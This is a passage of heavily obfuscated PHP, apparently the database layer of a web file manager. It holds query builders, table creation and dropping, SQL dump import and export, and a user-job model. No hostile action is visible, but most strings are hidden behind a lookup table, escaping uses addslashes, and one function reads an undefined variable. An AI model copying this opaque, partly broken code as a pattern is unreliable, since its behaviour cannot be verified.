$Aµ²²¾˜ğ†[815] . $this->parseTable($c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[264]]) . $Aµ²²¾˜ğ†[809] . implode($Aµ²²¾˜ğ†[47], $CÈí¦ğ–â) . $Aµ²²¾˜ğ†[810] . implode($Aµ²²¾˜ğ†[47], $CâŞ‚¦éÕÉ) . $Aµ²²¾˜ğ†[811]; $f¿Òã„‡ê .= $this->parseLock(isset($c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[765]]) ? $c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[765]] : !1); goto F‚Ñè¦«ñ; F‚Ñè¦«ñ: $f¿Òã„‡ê .= $this->parseComment(!empty($c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[338]]) ? $c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[338]] : $Aµ²²¾˜ğ†[33]); return $this->execute($f¿Òã„‡ê, $this->parseBind(!empty($c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[270]]) ? $c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[270]] : array())); goto CµÆ¬„; bÂ¢·æïÏ: $Aµ²²¾˜ğ† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CâŞ‚¦éÕÉ = $CÈí¦ğ–â = array(); $this->model = $c³İÕ¡‡öÜ[$Aµ²²¾˜ğ†[266]]; goto f†ÌÄ‚Û¸¾; CµÆ¬„: } public function selectInsert($E“…óË¤Ã±, $Cê²œ±õáö, $eèØ¨È‚ = array()) { goto eª˜¦®Â; f©ÕÅ‰••: array_walk($E“…óË¤Ã±, array($this, $FàÅœÅ²™[812])); $bğê£ÈâÖì = $FàÅœÅ²™[947] . $this->parseTable($Cê²œ±õáö) . $FàÅœÅ²™[809] . implode($FàÅœÅ²™[47], $E“…óË¤Ã±) . $FàÅœÅ²™[926]; $bğê£ÈâÖì .= $this->buildSelectSql($eèØ¨È‚); goto aĞœ‰‚¶–Š; aĞœ‰‚¶–Š: return $this->execute($bğê£ÈâÖì, $this->parseBind(!empty($eèØ¨È‚[$FàÅœÅ²™[270]]) ? $eèØ¨È‚[$FàÅœÅ²™[270]] : array())); goto c§öœÇôéË; eª˜¦®Â: $FàÅœÅ²™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->model = $eèØ¨È‚[$FàÅœÅ²™[266]]; if (is_string($E“…óË¤Ã±)) { $E“…óË¤Ã± = explode($FàÅœÅ²™[47], $E“…óË¤Ã±); } goto f©ÕÅ‰••; c§öœÇôéË: } public function update($cï¿Õ»Ûá, $e˜†£õâè†) { $dÇ‹“ÏÑŒ• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->model = $e˜†£õâè†[$dÇ‹“ÏÑŒ•[266]]; $E÷·Â™„© = $dÇ‹“ÏÑŒ•[948] . $this->parseTable($e˜†£õâè†[$dÇ‹“ÏÑŒ•[264]]) . $this->parseSet($cï¿Õ»Ûá) . $this->parseWhere(!empty($e˜†£õâè†[$dÇ‹“ÏÑŒ•[260]]) ? $e˜†£õâè†[$dÇ‹“ÏÑŒ•[260]] : $dÇ‹“ÏÑŒ•[33]) . $this->parseOrder(!empty($e˜†£õâè†[$dÇ‹“ÏÑŒ•[347]]) ? $e˜†£õâè†[$dÇ‹“ÏÑŒ•[347]] : $dÇ‹“ÏÑŒ•[33]) . $this->parseLimit(!empty($e˜†£õâè†[$dÇ‹“ÏÑŒ•[277]]) ? $e˜†£õâè†[$dÇ‹“ÏÑŒ•[277]] : $dÇ‹“ÏÑŒ•[33]) . $this->parseLock(isset($e˜†£õâè†[$dÇ‹“ÏÑŒ•[765]]) ? $e˜†£õâè†[$dÇ‹“ÏÑŒ•[765]] : !1) . $this->parseComment(!empty($e˜†£õâè†[$dÇ‹“ÏÑŒ•[338]]) ? $e˜†£õâè†[$dÇ‹“ÏÑŒ•[338]] : $dÇ‹“ÏÑŒ•[33]); return $this->execute($E÷·Â™„©, $this->parseBind(!empty($e˜†£õâè†[$dÇ‹“ÏÑŒ•[270]]) ? $e˜†£õâè†[$dÇ‹“ÏÑŒ•[270]] : array())); } public function delete($e¾ƒÏ¥ğ¬• = array()) { $c†ÆåÜï™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->model = $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[266]]; $c³Šèê‹ = $c†ÆåÜï™[949] . $this->parseTable($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[264]]) . $this->parseWhere(!empty($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[260]]) ? $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[260]] : $c†ÆåÜï™[33]) . $this->parseOrder(!empty($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[347]]) ? $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[347]] : $c†ÆåÜï™[33]) . $this->parseLimit(!empty($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[277]]) ? $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[277]] : $c†ÆåÜï™[33]) . $this->parseLock(isset($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[765]]) ? $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[765]] : !1) . $this->parseComment(!empty($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[338]]) ? $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[338]] : $c†ÆåÜï™[33]); return $this->execute($c³Šèê‹, $this->parseBind(!empty($e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[270]]) ? $e¾ƒÏ¥ğ¬•[$c†ÆåÜï™[270]] : array())); } public function select($DˆÙ£öÁ = array()) { goto C¥ê”ô‡ÚÃ; EŒ¬ÄÆ¹Á: if ($Fß¾Ñ¦áìÀ && !1 !== $cÅ¨§âŸ) { think_cache($C•Œö“ÏÛ™, $cÅ¨§âŸ, $Fß¾Ñ¦áìÀ); } return $cÅ¨§âŸ; goto cñ°¤ñ¢é³; e³°óó­Å·: $Fß¾Ñ¦áìÀ = isset($DˆÙ£öÁ[$eî¬—÷‡àÎ[334]]) ? $DˆÙ£öÁ[$eî¬—÷‡àÎ[334]] : !1; if ($Fß¾Ñ¦áìÀ) { $C•Œö“ÏÛ™ = is_string($Fß¾Ñ¦áìÀ[$eî¬—÷‡àÎ[89]]) ? $Fß¾Ñ¦áìÀ[$eî¬—÷‡àÎ[89]] : $eî¬—÷‡àÎ[950] . md5($Açë‚‘„“); $A·øªİÔ»ã = think_cache($C•Œö“ÏÛ™, $eî¬—÷‡àÎ[33], $Fß¾Ñ¦áìÀ); if (!1 !== $A·øªİÔ»ã) { return $A·øªİÔ»ã; } } $cÅ¨§âŸ = $this->query($Açë‚‘„“, $this->parseBind(!empty($DˆÙ£öÁ[$eî¬—÷‡àÎ[270]]) ? $DˆÙ£öÁ[$eî¬—÷‡àÎ[270]] : array())); goto EŒ¬ÄÆ¹Á; C¥ê”ô‡ÚÃ: $eî¬—÷‡àÎ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->model = $DˆÙ£öÁ[$eî¬—÷‡àÎ[266]]; $Açë‚‘„“ = $this->buildSelectSql($DˆÙ£öÁ); goto e³°óó­Å·; cñ°¤ñ¢é³: } public function buildSelectSql($C‡Æ½á©öù = array()) { goto d¦‘²ŸºÒ¶; FÀÎóÓÊçÓ: $FÌÆ¾ÚÄ† = $this->parseSql($this->selectSql, $C‡Æ½á©öù); $FÌÆ¾ÚÄ† .= $this->parseLock(isset($C‡Æ½á©öù[$f´Û‰“õ¶Ç[765]]) ? $C‡Æ½á©öù[$f´Û‰“õ¶Ç[765]] : !1); if (isset($E¾÷Ê’´µä)) { think_cache($E¾÷Ê’´µä, $FÌÆ¾ÚÄ†); } goto Cğ¾Çåßíâ; Cğ¾Çåßíâ: return $FÌÆ¾ÚÄ†; goto DÎàİ†©³£; d¦‘²ŸºÒ¶: $f´Û‰“õ¶Ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($C‡Æ½á©öù[$f´Û‰“õ¶Ç[337]])) { if (strpos($C‡Æ½á©öù[$f´Û‰“õ¶Ç[337]], $f´Û‰“õ¶Ç[47])) { list($bƒ·ÔÊŠÈ¿, $F˜‡ºãè‡) = explode($f´Û‰“õ¶Ç[47], $C‡Æ½á©öù[$f´Û‰“õ¶Ç[337]]); } else { $bƒ·ÔÊŠÈ¿ = $C‡Æ½á©öù[$f´Û‰“õ¶Ç[337]]; } $bƒ·ÔÊŠÈ¿ = $bƒ·ÔÊŠÈ¿ ? $bƒ·ÔÊŠÈ¿ : 1; $F˜‡ºãè‡ = isset($F˜‡ºãè‡) ? $F˜‡ºãè‡ : (is_numeric($C‡Æ½á©öù[$f´Û‰“õ¶Ç[277]]) ? $C‡Æ½á©öù[$f´Û‰“õ¶Ç[277]] : 20); $CÃ˜Ëó¿… = $F˜‡ºãè‡ * ((int) $bƒ·ÔÊŠÈ¿ - 1); $C‡Æ½á©öù[$f´Û‰“õ¶Ç[277]] = $CÃ˜Ëó¿… . $f´Û‰“õ¶Ç[47] . $F˜‡ºãè‡; } if (think_config($f´Û‰“õ¶Ç[951])) { $E¾÷Ê’´µä = $f´Û‰“õ¶Ç[952] . md5(serialize($C‡Æ½á©öù)); $AÃ«ÍÌà¡ = think_cache($E¾÷Ê’´µä); if ($AÃ«ÍÌà¡) { return $AÃ«ÍÌà¡; } } goto FÀÎóÓÊçÓ; DÎàİ†©³£: } public function parseSql($dòçóÚÈéÏ, $B‚ßÓ…´Å = array()) { $f¼‡À˜â‚¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dòçóÚÈéÏ = str_replace(array($f¼‡À˜â‚¢[953], $f¼‡À˜â‚¢[954], $f¼‡À˜â‚¢[955], $f¼‡À˜â‚¢[956], $f¼‡À˜â‚¢[957], $f¼‡À˜â‚¢[958], $f¼‡À˜â‚¢[959], $f¼‡À˜â‚¢[960], $f¼‡À˜â‚¢[961], $f¼‡À˜â‚¢[962], $f¼‡À˜â‚¢[963]), array($this->parseTable("{$B‚ßÓ…´Å[$f¼‡À˜â‚¢[264]]}"), $this->parseDistinct(isset($B‚ßÓ…´Å[$f¼‡À˜â‚¢[964]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[964]] : !1), $this->parseField(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[258]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[258]] : $f¼‡À˜â‚¢[173]), $this->parseJoin(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[267]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[267]] : $f¼‡À˜â‚¢[33]), $this->parseWhere(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[260]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[260]] : $f¼‡À˜â‚¢[33]), $this->parseGroup(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[965]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[965]] : $f¼‡À˜â‚¢[33]), $this->parseHaving(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[966]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[966]] : $f¼‡À˜â‚¢[33]), $this->parseOrder(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[347]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[347]] : $f¼‡À˜â‚¢[33]), $this->parseLimit(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[277]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[277]] : $f¼‡À˜â‚¢[33]), $this->parseUnion(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[332]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[332]] : $f¼‡À˜â‚¢[33]), $this->parseComment(!empty($B‚ßÓ…´Å[$f¼‡À˜â‚¢[338]]) ? $B‚ßÓ…´Å[$f¼‡À˜â‚¢[338]] : $f¼‡À˜â‚¢[33])), $dòçóÚÈéÏ); return $dòçóÚÈéÏ; } public function getLastSql($fôƒ»­‚†Â = '') { return $fôƒ»­‚†Â ? $this->modelSql[$fôƒ»­‚†Â] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f‡¼°Úåå) { return addslashes($f‡¼°Úåå); } public function setModel($A¸âğ–‡ÀÈ) { $this->model = $A¸âğ–‡ÀÈ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($dëš½·‚¶è, $EŒà¶£Š† = '') { $this->database = $dëš½·‚¶è; $this->type = $EŒà¶£Š†; } public function model($b¯•ïõÌŞ– = '') { return new ModelBase($b¯•ïõÌŞ–, $_SERVER[ÚŠ•´ÍéÒÑÔ][33], $this->database); } public function db($dÁÒÃêâ´Ü = false) { goto AË›œó‹š¿; AË›œó‹š¿: $F–ÆƒÉÕÒˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B‹ŠÀ¥ÈÖğ = $this->database; if ($this->type == $F–ÆƒÉÕÒˆ[9] || !$dÁÒÃêâ´Ü) { return $this->model()->db(); } goto F„©´ÖŒÏ°; eîí´é†…¦: $this->database = $B‹ŠÀ¥ÈÖğ; $f‡ĞÚÆ­‡‰->execute("\165\163\x65\40\x60{$Eñİ±¸Æ}\140"); return $f‡ĞÚÆ­‡‰; goto dÂ¿Ì°šçå; F¶¹öÈò: if (!$CçÓ··Æ¢) { $f‡ĞÚÆ­‡‰->execute("\x63\x72\145\x61\x74\x65\40\x64\x61\x74\x61\142\x61\x73\145\40\140{$Eñİ±¸Æ}\x60"); } $B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[231]] = $Eñİ±¸Æ; if ($B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[882]] == $F–ÆƒÉÕÒˆ[719]) { $B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[881]] .= $F–ÆƒÉÕÒˆ[967] . $Eñİ±¸Æ; } goto eîí´é†…¦; F„©´ÖŒÏ°: $Eñİ±¸Æ = $B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[231]]; $B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[231]] = $F–ÆƒÉÕÒˆ[33]; if ($B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[882]] == $F–ÆƒÉÕÒˆ[719]) { $F†Œ·¬²ì× = $B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[881]]; $B‹ŠÀ¥ÈÖğ[$F–ÆƒÉÕÒˆ[881]] = substr($F†Œ·¬²ì×, 0, strrpos($F†Œ·¬²ì×, $F–ÆƒÉÕÒˆ[967])); } goto Bå‚Å…™äè; Bå‚Å…™äè: $this->database = $B‹ŠÀ¥ÈÖğ; $f‡ĞÚÆ­‡‰ = $this->model()->db(); $CçÓ··Æ¢ = $f‡ĞÚÆ­‡‰->execute("\163\150\157\x77\40\144\141\164\141\142\x61\163\145\163\x20\x6c\151\153\x65\x20\x27{$Eñİ±¸Æ}\47"); goto F¶¹öÈò; dÂ¿Ì°šçå: } public function createTable($e†ìÙ”ÕÊ¤, $F–ôí‰¨İ = null) { $c´š‰£± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!IO::exist($e†ìÙ”ÕÊ¤)) { show_json(LNG($c´š‰£±[968]), !1); } $c„ÓÄ„èâ = sqlSplit(IO::getContent($e†ìÙ”ÕÊ¤)); foreach ($c„ÓÄ„èâ as $EÕÖ¼˜¤Èö) { if ($F–ôí‰¨İ) { $dç•¸¶Û = stripos($EÕÖ¼˜¤Èö, $c´š‰£±[969]) === 0; if ($dç•¸¶Û) { $F–ôí‰¨İ->task[$c´š‰£±[970]] += 1; } } $this->model()->db()->execute($EÕÖ¼˜¤Èö); if ($F–ôí‰¨İ && $dç•¸¶Û) { $F×‘ÊíÆÚ = $c´š‰£±[971]; preg_match($F×‘ÊíÆÚ, $EÕÖ¼˜¤Èö, $bßó©Åö·õ); $F–ôí‰¨İ->task[$c´š‰£±[972]] = trim($DÒñ¯îùÏ¦[0], $c´š‰£±[818]); $F–ôí‰¨İ->update(1); } } $this->taskToCache($F–ôí‰¨İ); } public function insertTable($BŒ¬ÊÄïƒ, $B•Íò‰‹ç³ = null) { $d¸£®•âË° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($BŒ¬ÊÄïƒ as $dÊÃÎÏ•Œš) { $D­‚ŸÖå› = basename($dÊÃÎÏ•Œš); $D­‚ŸÖå› = substr($D­‚ŸÖå›, 0, strrpos($D­‚ŸÖå›, $d¸£®•âË°[93])); if ($B•Íò‰‹ç³) { $B•Íò‰‹ç³->task[$d¸£®•âË°[972]] = $D­‚ŸÖå›; } if (get_filesize($dÊÃÎÏ•Œš) == 0) { continue; } $fÕ¼Å®–“Á = $this->sqlToDb($dÊÃÎÏ•Œš, $B•Íò‰‹ç³); if (!$fÕ¼Å®–“Á) { show_json(LNG($d¸£®•âË°[973]) . "\x5b{$D­‚ŸÖå›}\x5d", !1); } } $this->taskToCache($B•Íò‰‹ç³); } public function sqlFromDb($A“§ñä‚‘¿, $BÊÕïª»¢î, $eôƒ†ˆ›¶Ÿ = null, $Fà‡ÜÁÎÛ = null) { goto A¯¥ÀÃÂŞ…; Fßî§Á…İÂ: $e¾¯×Ú‹É§ = 1; $cæ‘Ûëî³ê = 500; $Eƒ¾«”¾‘® = fopen($BÊÕïª»¢î, $_SERVER[ÚŠ•´ÍéÒÑÔ][974]); goto b¡¦›ğŒµ; b¡¦›ğŒµ: $BÛàô¡Ù¾Û = $cİí‚ˆ†Ş”->getPk(); $c¬®­°œ¢Ä = $cİí‚ˆ†Ş”->getDbFields(); do { $c»“¼ÙÙ·ƒ = $cİí‚ˆ†Ş”->field($c¬®­°œ¢Ä)->order($BÛàô¡Ù¾Û . $_SERVER[ÚŠ•´ÍéÒÑÔ][975])->selectPage($cæ‘Ûëî³ê, $e¾¯×Ú‹É§); $bäîå†æëÒ = !empty($c»“¼ÙÙ·ƒ[$_SERVER[ÚŠ•´ÍéÒÑÔ][351]]) ? $c»“¼ÙÙ·ƒ[$_SERVER[ÚŠ•´ÍéÒÑÔ][351]] : array(); if (!($eé´á­Ç¾ = count($bäîå†æëÒ))) { break; } if ($eôƒ†ˆ›¶Ÿ) { $eôƒ†ˆ›¶Ÿ->task[$_SERVER[ÚŠ•´ÍéÒÑÔ][970]] += $eé´á­Ç¾; } $A¬Ø·–ªÀÄ = array(); foreach ($bäîå†æëÒ as $D·£¸ë•¢) { if ($Fà‡ÜÁÎÛ) { $D·£¸ë•¢[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]] = "\173\151\157\72{$Fà‡ÜÁÎÛ}\175" . substr($D·£¸ë•¢[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]], strlen("\173\151\157\72{$D·£¸ë•¢[$_SERVER[ÚŠ•´ÍéÒÑÔ][738]]}\175")); $D·£¸ë•¢[$_SERVER[ÚŠ•´ÍéÒÑÔ][738]] = $Fà‡ÜÁÎÛ; } $A¬Ø·–ªÀÄ[] = $_SERVER[ÚŠ•´ÍéÒÑÔ][976] . $this->sqlEncode($D·£¸ë•¢) . $_SERVER[ÚŠ•´ÍéÒÑÔ][977]; } $CÇÉ„Üº§ = "\x49\116\x53\x45\122\x54\x20\111\x4e\x54\117\x20\140{$A“§ñä‚‘¿}\140\x20\50\140" . implode($_SERVER[ÚŠ•´ÍéÒÑÔ][978], $c¬®­°œ¢Ä) . $_SERVER[ÚŠ•´ÍéÒÑÔ][979]; fwrite($Eƒ¾«”¾‘®, $CÇÉ„Üº§ . implode($_SERVER[ÚŠ•´ÍéÒÑÔ][980], $A¬Ø·–ªÀÄ) . $_SERVER[ÚŠ•´ÍéÒÑÔ][67] . PHP_EOL); $e¾¯×Ú‹É§++; $eÎÖ¡ö†Å += $eé´á­Ç¾; if ($eôƒ†ˆ›¶Ÿ) { $eôƒ†ˆ›¶Ÿ->update($eé´á­Ç¾); } } while ($eé´á­Ç¾ == $cæ‘Ûëî³ê); goto a’¿ÃÛ‰–À; A¯¥ÀÃÂŞ…: if ($eôƒ†ˆ›¶Ÿ) { $eôƒ†ˆ›¶Ÿ->task[$_SERVER[ÚŠ•´ÍéÒÑÔ][972]] = $A“§ñä‚‘¿; } $cİí‚ˆ†Ş” = $this->model($A“§ñä‚‘¿); $eÎÖ¡ö†Å = 0; goto Fßî§Á…İÂ; a’¿ÃÛ‰–À: fclose($Eƒ¾«”¾‘®); return $eÎÖ¡ö†Å; goto DöŞËÏ‘äô; DöŞËÏ‘äô: } public function sqlToDb($D‘ï¿…ìß•, $cÜóÈÉ‹‘ = null) { goto cÎ¯…¾ÆÑ¨; F¡ÔµÕˆ‚Ğ: if ($Aàˆ†œ±¸³) { $Aàˆ†œ±¸³ = rtrim(trim($Aàˆ†œ±¸³), $b¤¹“‡Ú[67]); if (!$C¸»ÔÚ­™§->execute($Aàˆ†œ±¸³)) { return !1; } if ($cÜóÈÉ‹‘) { $cÜóÈÉ‹‘->update($F—ÛŸ·ó¢˜ - 1); } } return !0; goto EªğĞõÔ×; Aß‚°•®²™: if (!$b–™Ñ¸åë) { return !1; } $F—ÛŸ·ó¢˜ = 0; $Aàˆ†œ±¸³ = $b¤¹“‡Ú[33]; goto f¶à‹¿¾Ğ„; f¶à‹¿¾Ğ„: $C–ôÄÜ‹‰¦ = 500 + 1; while (!feof($b–™Ñ¸åë)) { if ($cÜóÈÉ‹‘ && $F—ÛŸ·ó¢˜ != 0) { $cÜóÈÉ‹‘->task[$b¤¹“‡Ú[970]] += 1; } $F—ÛŸ·ó¢˜++; $B¹éÈ“»§ = trim(fgets($b–™Ñ¸åë)); $Aàˆ†œ±¸³ .= $b¤¹“‡Ú[50] . $this->sqlDecode($B¹éÈ“»§, $this->type); if ($F—ÛŸ·ó¢˜ == $C–ôÄÜ‹‰¦) { $Aàˆ†œ±¸³ = rtrim(trim($Aàˆ†œ±¸³), $b¤¹“‡Ú[67]); if (!$C¸»ÔÚ­™§->execute($Aàˆ†œ±¸³)) { return !1; } if ($cÜóÈÉ‹‘) { $cÜóÈÉ‹‘->update($F—ÛŸ·ó¢˜ - 1); } $Aàˆ†œ±¸³ = $b¤¹“‡Ú[33]; $F—ÛŸ·ó¢˜ = 0; } } fclose($b–™Ñ¸åë); goto F¡ÔµÕˆ‚Ğ; cÎ¯…¾ÆÑ¨: $b¤¹“‡Ú =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C¸»ÔÚ­™§ = $this->model()->db(); $b–™Ñ¸åë = @fopen($D‘ï¿…ìß•, $b¤¹“‡Ú[981]); goto Aß‚°•®²™; EªğĞõÔ×: } public function dropTable($EÍ¦øÁš¤ = null) { $e¾¯÷Œ¿ù = $this->model()->db(); $Aƒàá¿ç‰µ = $EÍ¦øÁš¤ ? array($EÍ¦øÁš¤) : $e¾¯÷Œ¿ù->getTables(); if (!$Aƒàá¿ç‰µ) { return; } foreach ($Aƒàá¿ç‰µ as $EÍ¦øÁš¤) { $e¾¯÷Œ¿ù->execute("\x64\162\x6f\160\40\x74\x61\x62\154\145\40\x69\146\x20\145\170\151\x73\x74\x73\x20\140{$EÍ¦øÁš¤}\x60"); } } private function taskToCache($EâË¿ñÎŒù = null) { $C¦…õŒÖÊÛ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$EâË¿ñÎŒù) { return; } $CÅ†ƒÇ¸Ÿ… = array($C¦…õŒÖÊÛ[972] => $EâË¿ñÎŒù->task[$C¦…õŒÖÊÛ[972]], $C¦…õŒÖÊÛ[970] => $EâË¿ñÎŒù->task[$C¦…õŒÖÊÛ[970]], $C¦…õŒÖÊÛ[982] => $EâË¿ñÎŒù->task[$C¦…õŒÖÊÛ[982]]); if ($CÅ†ƒÇ¸Ÿ…[$C¦…õŒÖÊÛ[970]] == $CÅ†ƒÇ¸Ÿ…[$C¦…õŒÖÊÛ[982]]) { $CÅ†ƒÇ¸Ÿ…[$C¦…õŒÖÊÛ[691]] = 1; } Cache::set($C¦…õŒÖÊÛ[983] . $EâË¿ñÎŒù->task[$C¦…õŒÖÊÛ[364]], $CÅ†ƒÇ¸Ÿ…); $EâË¿ñÎŒù->end(); } private function sqlEncode($c’º´Ö†½õ) { $A±”¹Ş‚ø¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dáØŸÅ„ïÌ = array(); foreach ($c’º´Ö†½õ as $fùî…Œèá¶) { if (is_array($fùî…Œèá¶)) { $fùî…Œèá¶ = json_encode_force($fùî…Œèá¶); } $fùî…Œèá¶ = addslashes($fùî…Œèá¶); $fùî…Œèá¶ = str_replace(array($A±”¹Ş‚ø¡[984], $A±”¹Ş‚ø¡[214]), array($A±”¹Ş‚ø¡[985], $A±”¹Ş‚ø¡[986]), $fùî…Œèá¶); $dáØŸÅ„ïÌ[] = str_replace($A±”¹Ş‚ø¡[55], $A±”¹Ş‚ø¡[987], $fùî…Œèá¶); } return $A±”¹Ş‚ø¡[55] . implode($A±”¹Ş‚ø¡[988], $dáØŸÅ„ïÌ) . $A±”¹Ş‚ø¡[55]; } private function sqlDecode($D§ÉÊ…ì¥, $BåÛ½Ÿ¤‹İ) { $A¹×Õ¶Ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D§ÉÊ…ì¥ = str_replace(array($A¹×Õ¶Ğ[985], $A¹×Õ¶Ğ[986]), array($A¹×Õ¶Ğ[984], $A¹×Õ¶Ğ[214]), $D§ÉÊ…ì¥); if ($BåÛ½Ÿ¤‹İ == $A¹×Õ¶Ğ[9]) { $D§ÉÊ…ì¥ = stripslashes($D§ÉÊ…ì¥); } return $D§ÉÊ…ì¥; } } goto fÜ”¯°ô; Bº£šÜ”Ş«: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x6a\x6f\x62\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\144\145\163\x63", "\163\157\x72\164"); const JOB_KEY = "\x73\145\x6c\146\112\157\x62\114\151\x73\x74"; public function listData($c¾¿ÂÚ‘£ = false, $aÃÜ³—Ë‚¢ = "\x73\157\162\x74", $d˜İ‰èôØ” = false) { return parent::listData($c¾¿ÂÚ‘£, $aÃÜ³—Ë‚¢, $d˜İ‰èôØ”); } public function remove($Føì±Ñ†‰¶) { return parent::remove($Føì±Ñ†‰¶); } public function add($dÁÑÇ”í ) { $cœÑçáÔƒí =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->findByName($dÁÑÇ”í [$cœÑçáÔƒí[28]])) { return !1; } $dÁÑÇ”í [$cœÑçáÔƒí[2093]] = $this->getSort(); return parent::insert($dÁÑÇ”í ); } private function getSort() { $b“ˆÏ†è… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aëÅÈ÷…Ë = parent::listData(); $dæ”õåÂ…Ÿ = array_to_keyvalue($aëÅÈ÷…Ë, $b“ˆÏ†è…[33], $b“ˆÏ†è…[2093]); return empty($dæ”õåÂ…Ÿ) ? 0 : max($dæ”õåÂ…Ÿ) + 1; } public function update($bİ±ëáÊê±, $D†¼Ïå…¢å) { $aŸ…–ĞÖàì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÜáœæï¹ = parent::listData($bİ±ëáÊê±); $cæš¸ßÉ·± = $this->findByName($D†¼Ïå…¢å[$aŸ…–ĞÖàì[28]]); if (!$BÜáœæï¹ || $cæš¸ßÉ·± && $cæš¸ßÉ·±[$aŸ…–ĞÖàì[364]] != $BÜáœæï¹[$aŸ…–ĞÖàì[364]]) { return !1; } return parent::update($bİ±ëáÊê±, $D†¼Ïå…¢å); } public function setUserJob($e÷ùÏ¦£‹Â, $dªÈĞèÈ¹Œ) { goto e˜¤×ã¦¹®; e˜¤×ã¦¹®: $eˆóÓÌçğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!is_array($dªÈĞèÈ¹Œ)) { $dªÈĞèÈ¹Œ = array($dªÈĞèÈ¹Œ); } $Cí¿Å¨ë… = parent::listData(); goto dºåİ¼á­­; BíŒ†Í™ô¹: $CµºÏ‰È˜ğ = rtrim($CµºÏ‰È˜ğ, $eˆóÓÌçğ[47]); Model($eˆóÓÌçğ[473])->metaSet($e÷ùÏ¦£‹Â, self::JOB_KEY, $CµºÏ‰È˜ğ); goto A±ˆ´¹°Åá; dºåİ¼á­­: $eÔŸ¦êÕÆ– = array_to_keyvalue($Cí¿Å¨ë…, $eˆóÓÌçğ[28]); $CµºÏ‰È˜ğ = $eˆóÓÌçğ[358]; foreach ($dªÈĞèÈ¹Œ as $eÏ·‹Š›Ò°) { if ($eÔŸ¦êÕÆ–[$eÏ·‹Š›Ò°]) { $CµºÏ‰È˜ğ .= $eÔŸ¦êÕÆ–[$eÏ·‹Š›Ò°][$eˆóÓÌçğ[364]] . $eˆóÓÌçğ[47]; } else { $f‹†Í™ƒÒ = $this->add($eÏ·‹Š›Ò°); $CµºÏ‰È˜ğ .= $f‹†Í™ƒÒ . $eˆóÓÌçğ[47]; } } goto BíŒ†Í™ô¹; A±ˆ´¹°Åá: } public function getUserJob($D·¾ÖºÊÁÅ) { $bÉ »Æ = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][473])->metaGet($D·¾ÖºÊÁÅ); return $this->getUserJobInfo($bÉ »Æ[self::JOB_KEY]); } public function getUserJobInfo($f†£õ®) { goto c•‚œ‚–ŸÍ; D¯ó¤ ¢Ó: $b’½ÜÑŸÇÎ = array_remove_key($b’½ÜÑŸÇÎ, $F§ñ™ÚêË[184]); 